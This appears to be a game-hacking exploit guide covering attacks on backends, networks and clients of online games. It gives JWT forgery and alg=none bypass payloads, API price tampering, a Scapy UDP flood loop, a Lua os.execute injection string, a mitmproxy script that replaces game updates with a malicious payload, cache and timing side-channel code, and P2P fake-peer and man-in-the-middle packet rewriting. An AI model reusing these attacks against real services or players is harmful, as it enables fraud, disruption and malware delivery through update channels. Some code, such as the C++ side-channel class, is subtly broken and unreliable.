## Remote and Server-Side Exploits

Game backends often expose vulnerable APIs or real-time logic bugs.

### API Parameter Tampering

```http
POST /api/shop/buyItem
{
  "itemId": "super_legendary_sword",
  "price": 1
}
```

If price is only enforced client-side → free legendary loot.

Test With: Burp Suite, mitmproxy, Python requests

### JWT Token Forgery

```python
import jwt
token = jwt.encode({"user": "admin"}, "wrongkey", algorithm="HS256")
```

Works if backend accepts unsigned or improperly verified tokens.

**alg=none Bypass:**

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Use: [jwt.io](https://jwt.io), `pyjwt`, or `node-jose`.

### Logic Exploits

- **Cooldown Tampering:** Send multiple "cast spell" packets in quick succession.
- **Currency Race Conditions:** Double-purchase via parallel POSTs.

Use `ffuf`, `Intruder`, or Python `asyncio` spammer.

### Network and Protocol Exploits

Low-level network attacks can crash or take control of networked games.

### UDP Fuzzing with Scapy

```python
from scapy.all import *

payload = b"A" * 1024
pkt = IP(dst="192.168.1.15")/UDP(dport=27015)/payload
send(pkt, loop=1, inter=0.01)
```

**Targets:**
- Legacy engine netcode (e.g., Source Engine)
- Poorly written packet parsers (e.g., Protobuf over UDP)
- Desync crashes in P2P engines (e.g., RakNet, Unity LLAPI)

### Custom Protocol Reversing

Use Wireshark + custom dissectors to reverse:
- Encryption schemes
- Opcode IDs (RPCs)
- Frag/ack logic in UDP game protocols

Combine with:
- `binwalk` for packet structure
- `boofuzz` to fuzz packet fields

### Asset-Based RCE (Texture, Music, Map Files)

Games that load external assets (like `.png`, `.mp3`, `.pak`) via third-party libraries can be exploited via:

- Malicious PNGs → `libpng` overflows
- Malformed MP3 → `libmad` parsing flaws
- Malicious `.bsp` or `.pak` → custom scripting hooks

Injected file triggers buffer overflows or logic flaws in parser.

Use: Peach Fuzzer, Fuzzino, or custom asset generators

### Exploit Examples Matrix

| Technique             | Target               | Description / Payload                              |
|-----------------------|----------------------|----------------------------------------------------|
| Stack Overflow        | Local buffer         | `strcpy()` → overwrite return address              |
| Savegame Injection    | Client-side RCE      | Craft `.sav` to trigger memory corruption          |
| JWT Forgery           | Backend auth bypass  | `alg=none` or wrong key → admin access             |
| Parameter Tampering   | Game API             | Buy top-tier items for 0 coins                     |
| Packet Fuzzing        | Multiplayer engine   | Oversized or malformed UDP packets                 |
| Race Condition Abuse  | Crafting/shop        | Double-purchase exploit with async flood           |
| Script Injection      | Lua-enabled titles   | `"name": "x'); os.execute('calc.exe') --"`         |
| Malicious Asset File  | Texture/audio/map    | Triggers in vulnerable parsers (e.g., `libpng`)    |

### Advanced: Smart Contract and Game Logic Hacking

For blockchain-based games:

- Replay signed transactions (double spend)
- Injected logic via proxy contract manipulation
- Abuse poorly-written game logic

**Example:**

```solidity
function upgradeWeapon(uint weaponId, uint cost) {
  require(balance[msg.sender] >= cost); // no actual deduction
  weaponLevel[weaponId]++;
}
```

Exploit: Weapon can be upgraded indefinitely.

### Toolchain for Exploit Research

| Purpose                | Tools                                  |
|------------------------|----------------------------------------|
| Savegame Fuzzing       | Radamsa, AFL++, Boofuzz                |
| Protocol Reversing     | Wireshark, Scapy, Ghidra               |
| Live Memory Analysis   | Cheat Engine, Frida, ReClass.NET       |
| Backend Exploits       | Burp Suite, Postman, mitmproxy         |
| JWT Manipulation       | pyjwt, jwt.io, node-jose               |
| File Format Exploits   | Binwalk, Peach Fuzzer, zzuf            |
| Multiplayer Spamming   | ffuf, python-requests, asyncio tools   |


---
## Modern Network Protocol Exploitation

### QUIC/HTTP3 Traffic Interception

QUIC is UDP-based and encrypted by default, requiring TLS inspection at application layer.

```python
from scapy.all import *
import dpkt

class QUICInterceptor:
    def __init__(self):
        self.connections = {}
        
    def intercept_quic(self, packet):
        if packet.haslayer(UDP):
            udp = packet[UDP]
            
            # QUIC typically uses port 443
            if udp.dport == 443 or udp.sport == 443:
                try:
                    # Parse QUIC header
                    data = bytes(udp.payload)
                    
                    # Check for QUIC packet (first byte flags)
                    if len(data) > 0 and (data[0] & 0xC0) != 0:
                        self.parse_quic_packet(data)
                except:
                    pass
    
    def parse_quic_packet(self, data):
        # Extract connection ID
        header_form = (data[0] & 0x80) >> 7
        
        if header_form == 1:  # Long header
            version = int.from_bytes(data[1:5], 'big')
            dcid_len = data[5]
            dcid = data[6:6+dcid_len]
            
            print(f"QUIC Connection: Version {version}, DCID {dcid.hex()}")
            
            # Track connection for later manipulation
            self.connections[dcid.hex()] = {
                'version': version,
                'packets': []
            }
```

### gRPC API Reverse Engineering

```python
import grpc
from grpc_reflection.v1alpha import reflection_pb2, reflection_pb2_grpc

class GRPCReverser:
    def __init__(self, target_host):
        self.host = target_host
        self.channel = grpc.insecure_channel(target_host)
        
    def discover_services(self):
        # Use server reflection to discover services
        stub = reflection_pb2_grpc.ServerReflectionStub(self.channel)
        
        request = reflection_pb2.ServerReflectionRequest(
            list_services=""
        )
        
        responses = stub.ServerReflectionInfo(iter([request]))
        
        services = []
        for response in responses:
            if response.HasField('list_services_response'):
                for service in response.list_services_response.service:
                    services.append(service.name)
                    print(f"Found service: {service.name}")
        
        return services
    
    def fuzz_service(self, service_name, method_name):
        # Get method descriptor
        stub = reflection_pb2_grpc.ServerReflectionStub(self.channel)
        
        # Request file descriptor
        request = reflection_pb2.ServerReflectionRequest(
            file_containing_symbol=f"{service_name}.{method_name}"
        )
        
        responses = stub.ServerReflectionInfo(iter([request]))
        
        for response in responses:
            if response.HasField('file_descriptor_response'):
                # Parse proto and fuzz
                self.fuzz_method(service_name, method_name, response)
```

### Protobuf Schema Extraction

```python
import struct

class ProtobufExtractor:
    def __init__(self, binary_data):
        self.data = binary_data
        self.fields = {}
        
    def extract_schema(self):
        offset = 0
        field_num = 1
        
        while offset < len(self.data):
            # Parse varint key
            key, bytes_read = self._read_varint(offset)
            offset += bytes_read
            
            field_number = key >> 3
            wire_type = key & 0x7
            
            # Determine field type
            if wire_type == 0:  # Varint
                value, bytes_read = self._read_varint(offset)
                offset += bytes_read
                self.fields[field_number] = ('int', value)
                
            elif wire_type == 1:  # 64-bit
                value = struct.unpack('<d', self.data[offset:offset+8])[0]
                offset += 8
                self.fields[field_number] = ('double', value)
                
            elif wire_type == 2:  # Length-delimited (string/bytes/message)
                length, bytes_read = self._read_varint(offset)
                offset += bytes_read
                value = self.data[offset:offset+length]
                offset += length
                
                # Try to decode as string
                try:
                    value_str = value.decode('utf-8')
                    self.fields[field_number] = ('string', value_str)
                except:
                    # Might be nested message
                    self.fields[field_number] = ('bytes', value.hex())
                    
            elif wire_type == 5:  # 32-bit
                value = struct.unpack('<f', self.data[offset:offset+4])[0]
                offset += 4
                self.fields[field_number] = ('float', value)
        
        return self.fields
    
    def _read_varint(self, offset):
        result = 0
        shift = 0
        bytes_read = 0
        
        while True:
            byte = self.data[offset + bytes_read]
            result |= (byte & 0x7F) << shift
            bytes_read += 1
            
            if (byte & 0x80) == 0:
                break
                
            shift += 7
        
        return result, bytes_read
```

---

## Supply Chain & Update Mechanism Attacks

### Game Update MITM Attack

```python
import mitmproxy
from mitmproxy import http
import hashlib
import os

class GameUpdateInjector:
    def __init__(self, target_domain, payload_path):
        self.target_domain = target_domain
        self.payload_path = payload_path
        
    def request(self, flow: http.HTTPFlow) -> None:
        # Intercept update requests
        if self.target_domain in flow.request.pretty_host:
            if '/updates/' in flow.request.path or '.patch' in flow.request.path:
                print(f'[+] Intercepted update request: {flow.request.path}')
    
    def response(self, flow: http.HTTPFlow) -> None:
        if self.target_domain in flow.request.pretty_host:
            if '/updates/' in flow.request.path:
                # Replace legitimate update with malicious payload
                with open(self.payload_path, 'rb') as f:
                    malicious_update = f.read()
                
                flow.response.content = malicious_update
                
                # Recalculate content-length
                flow.response.headers['content-length'] = str(len(malicious_update))
                
                print(f'[+] Injected malicious update ({len(malicious_update)} bytes)')

## Side-Channel Attacks for Game State Inference

### Cache-Based Side Channel

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define CACHE_LINE_SIZE 64
#define THRESHOLD 80

class CacheSideChannel {
public:
    // Flush+Reload attack
    static uint64_t ProbeAddress(void* addr) {
        uint64_t start, end;
        
        // Flush from cache
        _mm_clflush(addr);
        _mm_mfence();
        
        // Wait for victim to access
        for (volatile int i = 0; i < 1000; i++);
        
        // Measure reload time
        start = __rdtscp(&ui);
        *(volatile char*)addr;
        end = __rdtscp(&ui);
        
        _mm_mfence();
        
        return end - start;
    }
    
    // Detect if address was accessed by game
    static bool WasAccessed(void* addr) {
        uint64_t time = ProbeAddress(addr);
        return time < THRESHOLD;  // Fast = in cache = was accessed
    }
    
    // Monitor game state through cache
    static void MonitorGameState(void* game_state_addr, size_t size) {
        printf("[+] Monitoring game state via cache side-channel\n");
        
        while (true) {
            for (size_t offset = 0; offset < size; offset += CACHE_LINE_SIZE) {
                void* addr = (char*)game_state_addr + offset;
                
                if (WasAccessed(addr)) {
                    printf("[+] Cache line accessed: offset 0x%zx\n", offset);
                    
                    // Infer game state from access pattern
                    AnalyzeAccessPattern(offset);
                }
            }
            
            Sleep(10);
        }
    }
    
    static void AnalyzeAccessPattern(size_t offset) {
        // Example: Detect player position updates
        if (offset >= 0x100 && offset < 0x110) {
            printf("  -> Player position being updated\n");
        }
        // Example: Detect health changes
        else if (offset == 0x200) {
            printf("  -> Health value accessed\n");
        }
    }
    
private:
    static unsigned int ui;
};

unsigned int CacheSideChannel::ui = 0;
```

### Timing-Based Health Detection

```python
import time
import statistics

class TimingAttack:
    def __init__(self, game_process):
        self.process = game_process
        
    def measure_execution_time(self, function_addr, iterations=1000):
        times = []
        
        for _ in range(iterations):
            start = time.perf_counter_ns()
            
            # Call target function (via DLL injection or similar)
            self.call_function(function_addr)
            
            end = time.perf_counter_ns()
            times.append(end - start)
        
        return statistics.mean(times), statistics.stdev(times)
    
    def detect_health_threshold(self, damage_function_addr):
        # Health checks often have branches: if (health <= 0)
        # Timing will differ based on branch taken
        
        print('[+] Measuring damage function timing...')
        
        # Set health to different values and measure
        health_values = [100, 50, 25, 10, 1, 0]
        timings = {}
        
        for health in health_values:
            self.set_health(health)
            mean_time, std_dev = self.measure_execution_time(damage_function_addr)
            timings[health] = mean_time
            
            print(f'Health {health}: {mean_time:.2f}ns (±{std_dev:.2f})')
        
        # Detect timing anomaly (death threshold)
        for health, timing in timings.items():
            if abs(timing - timings[100]) > 50:  # Significant difference
                print(f'[+] Death threshold detected at health <= {health}')
                break
    
    def infer_enemy_count_by_timing(self, ai_update_addr):
        # AI update time scales with enemy count
        mean_time, _ = self.measure_execution_time(ai_update_addr, 100)
        
        # Approximate: 10ms per enemy
        estimated_enemies = int(mean_time / 10000000)
        
        print(f'[+] Estimated enemy count: {estimated_enemies}')
        return estimated_enemies
```

---

## P2P Network Exploitation

### Peer Discovery Manipulation

```python
from scapy.all import *
import struct

class P2PExploit:
    def __init__(self, game_port):
        self.game_port = game_port
        self.peers = []
        
    def discover_peers(self):
        # Sniff P2P discovery broadcasts
        def packet_handler(packet):
            if packet.haslayer(UDP) and packet[UDP].dport == self.game_port:
                peer_ip = packet[IP].src
                
                if peer_ip not in self.peers:
                    self.peers.append(peer_ip)
                    print(f'[+] Discovered peer: {peer_ip}')
        
        sniff(filter=f'udp port {self.game_port}', prn=packet_handler, timeout=30)
        
        return self.peers
    
    def inject_fake_peer(self, target_ip, fake_peer_ip):
        # Send fake peer announcement to target
        packet = IP(dst=target_ip)/UDP(dport=self.game_port)/Raw(load=self.craft_peer_announcement(fake_peer_ip))
        send(packet)
        
        print(f'[+] Injected fake peer {fake_peer_ip} to {target_ip}')
    
    def craft_peer_announcement(self, peer_ip):
        # Example P2P announcement format
        announcement = struct.pack('<I', 0x12345678)  # Magic
        announcement += struct.pack('<H', 1)           # Protocol version
        announcement += socket.inet_aton(peer_ip)      # IP address
        announcement += struct.pack('<H', self.game_port)  # Port
        
        return announcement
    
    def mitm_p2p_connection(self, peer1_ip, peer2_ip):
        # Intercept traffic between two peers
        def forward_packet(packet):
            if packet.haslayer(IP):
                if packet[IP].src == peer1_ip and packet[IP].dst == peer2_ip:
                    # Modify packet from peer1 to peer2
                    modified = self.modify_game_packet(packet)
                    send(modified)
                    
                elif packet[IP].src == peer2_ip and packet[IP].dst == peer1_ip:
                    # Modify packet from peer2 to peer1
                    modified = self.modify_game_packet(packet)
                    send(modified)
        
        sniff(filter=f'host {peer1_ip} or host {peer2_ip}', prn=forward_packet)
    
    def modify_game_packet(self, packet):
        # Example: Modify player position in P2P packet
        if packet.haslayer(Raw):
            payload = bytearray(packet[Raw].load)
            
            # Assume position at offset 8 (float x, y, z)
            if len(payload) >= 20:
                x, y, z = struct.unpack_from('<fff', payload, 8)
                
                # Teleport player
                x += 100.0
                struct.pack_into('<fff', payload, 8, x, y, z)
                
                packet[Raw].load = bytes(payload)
        
        # Recalculate checksum
        del packet[UDP].chksum
        del packet[IP].chksum
        
        return packet

